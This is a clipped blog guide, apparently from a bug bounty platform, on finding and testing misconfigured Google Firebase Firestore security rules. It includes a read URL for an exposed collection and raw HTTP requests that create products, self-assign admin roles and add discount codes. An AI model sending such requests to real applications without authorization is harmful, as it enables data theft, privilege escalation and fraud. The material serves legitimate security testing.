---
title: "Hacking misconfigured Firebase targets: A complete guide"
source: "https://www.intigriti.com/researchers/blog/hacking-tools/hacking-google-firebase-targets"
author:
  - "blackbird-eu"
published: 2025-08-12
created: 2025-08-12
description: "Google Firebase is a popular back-end application development platform that provides several built-in components and services, allowing developers to seamlessly build interactive web and mobile applic..."
tags: ["clippings/articles", "_inbox"]
---
# Hacking misconfigured Firebase targets: A complete guide

![](https://www.datocms-assets.com/85623/1754902702-intigriti-blog-tools-featured-hacking-misconfigured-firebase-targets.jpg?auto=format&fit=max&w=1200)

> [!summary]
> This guide covers hacking misconfigured Google Firebase Firestore and Storage services, which are backend platforms for web and mobile applications. It explains how Firebase security rules are crucial for access control and how their misconfiguration can lead to unauthorized data read, write, and delete operations. The article details methods for identifying Firebase targets, including examining HTTP requests, analyzing JavaScript files for configuration data, and using Google or GitHub dorking. It then delves into testing for missing access controls by directly interacting with Firebase's REST API, both anonymously and as an authenticated user, providing examples for overly-permissive read, create, write, and delete rules. Finally, it touches upon testing for CORS misconfigurations in Firebase Storage that could allow unauthorized cross-origin requests.

Google Firebase is a popular back-end application development platform that provides several built-in components and services, allowing developers to seamlessly build interactive web and mobile applications.

In this article, we will cover the most common security misconfigurations in targets that actively use Google Firebase Firestore or Storage.

## What is Google Firebase?

Google Firebase is a comprehensive app development platform owned by Google that provides backend-as-a-service (BaaS) functionality.

Services include authentication, storage analytics, and application hosting.

will put our main focus on two services:

1. **Firebase Firestore:** A NoSQL document database for storing and syncing app data in real-time across clients.
2. **Firebase Storage:** A Cloud storage service for storing and serving user-generated content like images, videos, and files.

Both services provide built-in security access control rules, which we want to dive deeper into.

### Firebase security rules

Firebase security rules are a declarative configuration language that defines who can access your Firebase resources and under what conditions.

For instance, in Firebase Firestore, security rules determine which users can read, write, update, or delete documents and collections in your NoSQL database. For Firebase Storage, security rules serve a similar protective function but focus on file operations rather than database operations. They control who can upload, download, modify, or delete files in your storage buckets.

## Finding & identifying Firebase targets

### Examining HTTP requests

The most straightforward approach to fingerprinting Firebase in your target is by examining outgoing HTTP requests. On some occasions, you will come across targets that make use of Firebase services without deploying a server between the client-side and Firebase's REST API.

\*.firebaseio.com and .firebaseapp.com

### Examining JavaScript files

JavaScript files will often contain Firebase configuration data, including the project ID, database URL (pointing to `*.firebaseio.com`, storage bucket (pointing to `firebasestorage.app`), etc

## Testing for missing access controls

It is worth noting that whenever testing for missing access controls, you must perform your tests directly against Firebase's REST API. Additionally, because of the way Firebase rules are enforced (deny-by-default), we must test for access controls with and without credentials. Practically, this means that we'll need to test access as an anonymous navigator (without credentials) as well as an authenticated (logged in) user.

Since Firebase security rules are granular and allow developers to specify security conditions per resource (such as file, database, database collection, etc.), we must ensure that we also test all endpoints separately.

### Testing for missing read access controls

Example of a misconfigured Firebase Firestore security rule definition

we can see that all access is restricted by default. However, access to the `/contact-form-data` endpoint is insufficiently protected, allowing anyone to read contact form inquiries containing sensitive contact details.

In practice, we could visit one of the following endpoints and read all the data:

```
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/contact-form-data
```

Example of a misconfigured Firebase Firestore instance

### Testing for missing create and write access controls

Firebase Firestore and Storage support the 4 data manipulation operations: **C**reate, **R**ead, **U**pdate (write), and **D**elete.

Example of a misconfigured Firebase Firestore security rule definition

we can spot 3 issues:

1. The endpoint `/admin-mgmt/products` only performs authentication checks (no authorization validation)
2. The endpoint `/admin-mgmt/discount-codes` allows read, create, and delete access if the user role of `admin` or `maintainer` is in the authentication object.
3. The endpoint `/users/profile` does not perform any data validation before insertion, allowing us (as an authenticated user) to assign or add a user role of choice.

The first flaw allows us to create new products as any authenticated user. Replicating the following HTTP request would essentially create a new product that'd be visible on the forefront of our target's webshop.

```
POST /v1/projects/<PROJECT_ID>/databases/(default)/documents/admin-mgmt/products HTTP/2
Host: firestore.googleapis.com
Content-Type: application/json
Authorization: Bearer USER_ID
Content-Length: 336

{
  "fields": {
    "name": {
      "stringValue": "New Product"
    },
    "price": {
      "doubleValue": 9999.99
    },
    "description": {
      "stringValue": "This product was created by an unauthorized user"
    },
    "category": {
      "stringValue": "intigriti"
    },
    "inStock": {
      "booleanValue": true
    }
  }
}
```

In combination with the `/admin-mgmt/discount-codes`, we can essentially add our discount codes that would work on the checkout page.

#### Request 1: Updating our profile to include the necessary user roles

```
PATCH /v1/projects/<PROJECT_ID>/databases/(default)/documents/users/profile/<USER_ID> HTTP/2
Host: firestore.googleapis.com
Content-Type: application/json
Authorization: Bearer <USER_ID_TOKEN>
Content-Length: 308

{
  "fields": {
    "name": {
      "stringValue": "Intigriti Example"
    },
    "email": {
      "stringValue": "intigriti@intigriti.me"
    },
    "roles": {
      "arrayValue": {
        "values": [
          {"stringValue": "admin"},
          {"stringValue": "maintainer"}
        ]
      }
    }
  }
}
```

#### Request 2: Adding new discount codes

```
POST /v1/projects/<PROJECT_ID>/databases/(default)/documents/admin-mgmt/discount-codes HTTP/2
Host: firestore.googleapis.com
Content-Type: application/json
Authorization: Bearer <USER_ID_TOKEN>
Content-Length: 308

{
  "fields": {
    "code": {
      "stringValue": "INTIGRITI1337"
    },
    "discount": {
      "doubleValue": 1337.0
    },
    "expiryDate": {
      "timestampValue": "2025-12-31T23:59:59Z"
    },
    "usageLimit": {
      "integerValue": 1
    },
    "isActive": {
      "booleanValue": true
    }
  }
}
```